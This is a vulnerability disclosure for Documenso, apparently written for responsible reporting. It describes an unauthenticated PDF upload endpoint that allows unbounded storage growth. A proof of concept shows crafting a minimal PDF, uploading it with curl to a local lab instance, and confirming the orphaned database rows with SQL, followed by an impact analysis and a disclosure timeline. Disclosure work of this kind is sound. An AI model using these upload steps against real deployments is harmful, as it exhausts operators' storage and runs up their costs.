https://github.com/documenso/documenso

## Finding: Unauthenticated PDF Upload Causes Unbounded Storage Growth

The `POST /api/files/upload-pdf` endpoint in the Hono server layer accepts PDF uploads and creates persistent `DocumentData` database records without requiring any authentication. Any unauthenticated HTTP client can upload valid PDF files, which are stored in the database (or S3 in S3-configured deployments) indefinitely. No cleanup mechanism exists for unlinked `DocumentData` records. At the default 50 MB per file and 20 requests per minute per IP rate limit, a single attacker IP can write up to 1 GB per minute of PDF data directly into the database. This is a storage exhaustion vulnerability.

POC
The following reproduces the issue against the Docker lab environment (`documenso/documenso:v2.11.0`, default configuration, no session cookies):

**Step 1 - Create a minimal valid PDF:**

```bash
printf '%%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n190\n%%%%EOF' > /tmp/test.pdf
```

**Step 2 - Upload without any authentication:**

```
POST /api/files/upload-pdf HTTP/1.1
Host: localhost:9123
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="file"; filename="test.pdf"
Content-Type: application/pdf

<pdf bytes>
------FormBoundary--
```

```bash
curl -s \
  -F "file=@/tmp/test.pdf;type=application/pdf;filename=test.pdf" \
  " http://localhost:9123/api/files/upload-pdf"
```

**Observed response (HTTP 200):**

```json
{
  "id": "cmpiit6vy0006tg20895e0acb",
  "type": "BYTES_64",
  "data": "JVBERi0xLjQK...",
  "initialData": "JVBERi0xLjQK..."
}
```

**Step 3 - Confirm record persists in the database:**

```bash
docker exec documenso_db psql -U documenso -d documenso -c \
  "SELECT id, type FROM \"DocumentData\" ORDER BY id DESC LIMIT 5;"
```

Output shows `DocumentData` rows created without any associated user or envelope.

**Step 4 - Confirm orphaned records have no cleanup path:**

```sql
SELECT COUNT(*) FROM "DocumentData" dd
WHERE NOT EXISTS (
  SELECT 1 FROM "EnvelopeItem" ei WHERE ei."documentDataId" = dd.id
);
```

Returns the count of unlinked rows (5 after our tests); no background job removes them.

Impact

1. **Storage exhaustion (database mode):** A single attacker IP may write up to 50 MB * 20 = 1 GB per minute into PostgreSQL, limited only by the IP rate limit and the 50 MB per-file cap. Coordinated requests from multiple IPs remove the per-IP limit entirely.

2. **Storage exhaustion (S3 mode):** The same applies against the operator's S3 bucket, incurring direct financial cost.

3. **Orphaned data accumulation:** No job in the codebase prunes `DocumentData` rows that are never linked to an `EnvelopeItem`. Records written by unauthenticated attackers remain permanently.

4. **Response leaks full PDF content:** The response body includes the `data` field containing the full base64-encoded PDF, allowing transient use of the endpoint as an anonymous file staging area, though this requires the caller to retain the response.

Confidentiality and integrity are not directly impacted because unauthenticated uploads cannot be associated with any user's document or accessed through normal document workflows.


### Disclosure:
 - 27 May 2026 - reported via email
 - 29 May 2026 - reported acknowledged
 - 27 August 2026 - followed up to check status
 - 28 August 2026 - confirmed deprecated

<img width="1236" height="360" alt="image" src="https://github.com/user-attachments/assets/22374ac0-f9f6-457f-873d-0e63970a9130" />
